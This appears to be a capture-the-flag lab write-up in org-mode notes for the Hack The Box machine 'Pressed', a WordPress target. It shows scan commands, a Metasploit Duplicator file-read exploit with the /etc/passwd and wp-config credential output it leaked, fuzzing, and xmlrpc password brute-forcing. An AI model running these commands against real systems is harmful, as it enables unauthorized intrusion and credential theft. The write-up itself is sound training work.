@@ -1,0 +1,142 @@
+==
+tags: #linux #hard #wordpress
+=
+
+* nmap
+  #+begin_src bat
+  sudo nmap -sV -sC -oA nmap/pressed.basic 10.129.136.28
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.9
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
+  #+end_src
+** full scan
+   #+begin_src bat
+   sudo nmap  -p- -A -T4 -oA nmap/agile.full 10.129.136.28
+   #+end_src
+* the website
+  it's a wordpress site with a post and a comment box; it calls =pressed.htb=
+  on submit so add that to the hosts file. we can see the wordpress version is
+  5.9 from the source
+** the port page                                                     :ATTACH:
+   :PROPERTIES:
+   :ID:       dd7521b4-0edc-4fa0-a901-8f29e1dce59e
+   :END:
+   the post displays visitors' user agents;
+   [[attachment:2026-08-02_13-58.png]]
+  
+   this seems to be done using a =php-everywhere= plugin which exposes an api to
+   directly run php code; however, it seems the code itself for generating the
+   block is stored directly in the database and not in a file we can exfiltrate.
+* wp scan
+  #+begin_src bat
+    sudo wpscan --url http://pressed.htb --enumerate --api-token <wpscan.token> -o wp-scan.out
+  #+end_src
+  this doesn't really tell us anything new; detects the =admin= user
+  let's do an aggressive scan:
+** aggressive scan
+   #+begin_src bat
+     wpscan --url pressed.htb --detection-mode aggressive --plugins-detection aggressive -o pressed.wp.out --api-token <wpscan.token> 
+   #+end_src
+   ok this detects a lot of vulns:
+* plugin vulns
+** duplicator
+   #+begin_src 
+  Title: Duplicator 1.3.24 & 1.3.26 - Unauthenticated Arbitrary File Download
+   #+end_src
+   there's a metasploit module, using which we can confirm this is indeed
+   vulnerable; edited to just show the interesting users.:
+   #+begin_src 
+  msf auxiliary(scanner/http/wp_duplicator_file_read) > run
+[*] Downloading file...
+
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+htb:x:1000:1000:htb:/home/htb:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/nonexistent:/bin/false
+
+[+] File saved in: /root/.msf4/loot/20260730015752_default_10.129.136.28_duplicator.trave_596347.txt
+   #+end_src
+   try the =htb= username against the =admin panel=, however the username is not valid
+   #+begin_src 
+   Error: The username htb is not registered on this site. If you are unsure of your username, try your email address instead.
+   #+end_src
+* wp-config
+  let's read the =wp-config.php= file; tried setting the path to =/var/www/html/pressed.htb/wp-config.php= but it failed.
+  instead:
+  #+begin_src bash
+  msf auxiliary(scanner/http/wp_duplicator_file_read) > set filepath /var/www/html/wp-config.php
+
+  msf auxiliary(scanner/http/wp_duplicator_file_read) > run
+  [*] Downloading file...
+
+  <?php
+  <SNIP>
+
+  // ** Database settings - You can get this info from your web host ** //
+  /** The name of the database for WordPress */
+  define( 'DB_NAME', 'wordpress' );
+  /** Database username */
+  define( 'DB_USER', 'admin' );
+  /** Database password */
+  define( 'DB_PASSWORD', 'uhc-jan-finals-2022' );
+  /** Database hostname */
+  define( 'db_host', 'localhost' );
+
+  <SNIP>
+  #+end_src
+  the backup file is also accessible by visiting the url:
+  #+begin_src
+  http://pressed.htb/wp-config.php.bak
+  #+end_src
+  #+begin_src bash
+  $ diff wp-config.php.bak wp-config.php 
+
+29c29
+< define( 'DB_PASSWORD', 'uhc-jan-finals-2021' );
+---
+> define( 'DB_PASSWORD', 'uhc-jan-finals-2022' );
+  #+end_src
+* other files
+  try downloading the =apache web config= files:
+  =/etc/apache2/sites-enabled/000-default.conf= is left unedited; try other
+  possibilibies s.a. =pressed.conf=, =pressed.htb.conf= but no dice.
+* fuzz
+** page fuzzing
+   #+begin_src 
+   ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u https://pressed.htb/FUZZ.php
+   #+end_src
+*** gobuster, raft wordlist
+    #+begin_src bat
+    gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.out -u http://pressed.htb
+    #+end_src
+    this finds a bunch of stuff:
+    #+begin_src bash
+    cat gobuster.out | grep -Ev '(Size: 0)|(Status: 403)'          
+
+wp-admin             (Status: 301) [Size: 313] [--> pressed.htb/wp-admin/]
+wp-includes          (Status: 301) [Size: 316] [--> pressed.htb/wp-includes/]
+wp-content           (Status: 301) [Size: 315] [--> pressed.htb/wp-content/]
+xmlrpc.php           (Status: 405) [Size: 42]
+wp-login.php         (Status: 200) [Size: 6197]
+wp-trackback.php     (Status: 200) [Size: 135]
+wp-links-opml.php    (Status: 200) [Size: 227]
+    #+end_src
+** subdomain fuzzing
+   #+begin_src bat
+   wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 10.129.136.28 -H "Host: FUZZ.pressed.htb" --hc 301 --hl 185
+   #+end_src
+* bruteforce login
+  #+begin_src bat
+  sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://pressed.htb --api-token <token>
+  #+end_src
+  smaller wordlist:
+  #+begin_src bat
+  sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt --url http://pressed.htb --api-token <token>
+  #+end_src
+* ippsec
+  this involves wordpress exploitation via =xmlrpc=, and it gets a bit involved,
+  skipping for now.
